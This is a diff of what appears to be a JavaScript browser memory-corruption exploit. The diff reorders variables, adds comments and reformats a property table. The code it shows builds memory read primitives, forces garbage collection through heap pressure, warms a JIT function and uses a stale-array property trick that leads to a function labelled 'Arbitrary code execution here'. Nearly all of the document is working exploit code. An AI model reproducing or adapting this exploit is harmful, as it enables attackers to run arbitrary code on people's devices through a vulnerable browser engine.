@@ -1,6 +1,16 @@
  var mem0 = 0;
  var mem1 = 0;
  var mem2 = 0;
+ var pressure = new Array(100);
+ var bufs = new Array(10000);
+ var print = alert;
+ _dview = null;
+
+ var trycatch = "";
+ for (var z = 0; z < 0x2000; z++) trycatch += "try{} catch(e){}; ";
+ var fc = new Function(trycatch);
+ var fcp = 0;
+ var smsh = new Uint32Array(0x10)
 
  function read4(addr) {
  	mem0[4] = addr;
@@ -15,18 +25,16 @@
  	mem0[4] = mem1;
  }
 
- var print = alert;
- _dview = null;
-
+// u2d returns a float64 from high and low values
  function u2d(low, hi) {
  	if (!_dview) _dview = new DataView(new ArrayBuffer(16));
  	_dview.setUint32(0, hi);
  	_dview.setUint32(4, low);
  	return _dview.getFloat64(0);
  }
- var pressure = new Array(100);
- var bufs = new Array(10000);
- dgc = function() {
+
+// dgc attempts to trigger a garbage collection by allocating a large amount of memory
+function dgc() {
  	for (var i = 0; i < pressure.length; i++) {
  		pressure[i] = new Uint32Array(0x10000);
  	}
@@ -53,11 +61,6 @@
  		}
  	}
  }
- var trycatch = "";
- for (var z = 0; z < 0x2000; z++) trycatch += "try{} catch(e){}; ";
- var fc = new Function(trycatch);
- var fcp = 0;
- var smsh = new Uint32Array(0x10)
 
  function smashed(stl) {
 	alert("Arbitrary code execution here.")
@@ -145,42 +148,18 @@
  		return 10;
  	};
  	var props = {
- 		p0: {
- 			value: 0
- 		},
- 		p1: {
- 			value: 1
- 		},
- 		p2: {
- 			value: 2
- 		},
- 		p3: {
- 			value: 3
- 		},
- 		p4: {
- 			value: 4
- 		},
- 		p5: {
- 			value: 5
- 		},
- 		p6: {
- 			value: 6
- 		},
- 		p7: {
- 			value: 7
- 		},
- 		p8: {
- 			value: 8
- 		},
- 		length: {
- 			value: not_number
- 		},
- 		stale: {
- 			value: arr
- 		},
- 		after: {
- 			value: 666
- 		}
+ 		p0: {value: 0},
+ 		p1: {value: 1},
+ 		p2: {value: 2},
+ 		p3: {value: 3},
+ 		p4: {value: 4},
+ 		p5: {value: 5},
+ 		p6: {value: 6},
+ 		p7: {value: 7},
+ 		p8: {value: 8},
+ 		length: {value: not_number},
+ 		stale: {value: arr},
+ 		after: {value: 666}
  	};
  	var target = [];
  	var stale = 0;
